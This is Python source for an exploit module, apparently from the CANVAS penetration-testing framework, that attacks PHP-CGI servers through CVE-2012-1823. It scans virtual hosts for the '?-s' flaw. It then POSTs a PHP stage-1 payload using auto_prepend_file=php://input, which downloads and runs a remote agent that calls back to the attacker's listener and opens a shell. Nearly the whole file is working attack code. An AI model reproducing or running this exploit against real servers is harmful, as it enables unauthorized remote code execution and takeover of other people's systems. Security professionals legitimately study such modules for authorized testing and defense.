#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")

import libs.spkproxy as spkproxy

from exploitutils import *
from ExploitTypes.php_multi import *

NAME                           = "php_cgi_remote"
DESCRIPTION                    = "PHP < 5.4 remote exploit"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "www.php.net"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2012-1823"
DOCUMENTATION["CVE URL"]       = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-1823"
DOCUMENTATION['CVSS']          = 7.5

DOCUMENTATION['Notes']         = """
Also see:
http://www.kb.cert.org/vuls/id/520827


"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ]

CHANGELOG                      = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.autoFind           = False
        self.host               = ""
        self.port               = 80

        self.badstring          = "\x00"
        self.version            = 1 
        self.done               = 0
        self.name               = NAME    

        self.basepath           = "/"
        self.hostname           = ""
        self.ssl                = False
        self.only_test          = False
        self.discover           = False
        self.basicauth_user     = ""
        self.basicauth_password = ""

        self.setVersions()

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s" % (v, self.versions[v][0])
            
    def getargs(self):
        """
        Get arguments for attack.
        """

        self.getarg("basepath")
        self.getarg("hostname")
        self.getarg("ssl")
        self.getarg("basicauth_user")
        self.getarg("basicauth_password")
        self.getarg("port")
        self.getarg("only_test")
        self.getarg("discover")
    

    def setVersions(self):
        self.versions    = {}
        self.versions[1] = ["PHP5"]

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        
        localhost = self.callback.ip
        localport = self.callback.port
        
        self.log("Using PHPMULTI callback of %s:%d" % (localhost, localport))
        from phplistener import get_php_stage1 #get our "Shellcode"
        
        #cannot use / in this code (theoretically)
        badchars = "/"
        ret = "<? "+get_php_stage1(badchars,localhost,localport) + " ?>"
        self.log("Generated callback shell of: %s" % ret)
        return ret

    def test_vuln(self, vhosts):
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        request = self.basepath + '?-s'
        ret = []

        for host in vhosts:
            try:
                data = spkproxy.urlopen(protocol+'://'+self.host+":%s" % self.port + request, hostname=host, exploit=self, auth=auth).read()
                if data.lower().startswith("<code>"): ret.append(host)
            except Exception:
                import traceback
                self.log(traceback.format_exc(5))

        return ret

    def run(self):
        self.getargs()
        self.host = self.target.interface
        
        self.setInfo("%s attacking %s (in progress)" % (NAME, self.host))
        self.log("%s attacking %s (in progress)" % (NAME, self.host))

        self.log('Port: %s' % self.port)
        self.log('SSL: %s' % self.ssl)
        self.log('Vhost: %s' % self.hostname)
        self.log('Basepath: %s' % self.basepath)
        self.log('Auth User: %s' % self.basicauth_user)
        self.log('Auth Password: %s' % self.basicauth_password)

        vhosts = set([])
        
        if self.hostname:
            vhosts.add(self.hostname)
        else:
            vhosts.add(self.host)

        # Check knowledge for vhosts
        vh = self.target.get_knowledge('vhosts')
        if vh: vhosts.update(vh.known)

        # Grab new ones 
        if self.discover:
            self.log('Grabbing vhosts..')
            app = self.engine.getModuleExploit("ip_to_vhosts")
            app.link(self)

            if app.run():
                vhosts.update(self.target.get_knowledge('vhosts').known)
            
        vulnerable = self.test_vuln(vhosts)
        
        if not vulnerable:
            self.log("%s doesn't seem to be vulnerable, aborting.." % self.host)
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

        for v in vulnerable:
            self.log('%s seems vulnerable!' % v)
            
        if self.only_test:
            self.setInfo("%s attacking %s - done (success!)" % (NAME, self.host))
            return 1
                
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        if self.basicauth_user != "":
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None
                    
        data = self.get_php_to_mosdef()
        url  = self.basepath + "?-ndallow_url_include+-d+safe_mode%3d0+-dauto_prepend_file%3dphp://input"

        for vhost in vulnerable:
            try:
                spkproxy.urlopen(protocol + '://' + self.host + ":" + str(self.port) + url, hostname=vhost,
                                 exploit=self, auth=auth, noresponse=True, verb='POST', data=data)
            except Exception:
                import traceback
                self.log(traceback.format_exc(5))

            self.log("Sent attack - looking to accept connection")

            for t in range(0, 5):
                self.log('Checking for success (%s/5)' % (t+1))

                if self.ISucceeded():
                    self.setInfo("%s attacking %s - done (success!)" % (NAME, self.host))
                    return 1
                time.sleep(1)
            
        self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
        return 0

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
